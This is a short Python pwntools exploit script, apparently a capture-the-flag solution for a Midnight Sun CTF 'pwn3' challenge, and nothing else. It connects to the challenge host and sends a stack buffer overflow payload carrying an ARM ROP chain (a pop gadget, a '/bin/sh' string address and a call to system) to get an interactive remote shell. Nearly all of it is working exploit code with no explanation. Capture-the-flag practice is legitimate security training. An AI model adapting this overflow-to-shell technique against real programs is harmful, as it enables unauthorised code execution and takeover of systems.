from pwn import *

p = remote('pwn3-01.play.midnightsunctf.se', 10003)
#p = process('./pwn3')

sys = 0x14b5c
binsh = 0x49018
pop = 0x0001fb5c # pop {r0, r4, pc}

pay = 'a'*0x8c
pay += p32(pop)+p32(binsh)+p32(0)+p32(sys+1)

p.sendline(pay)

p.interactive()
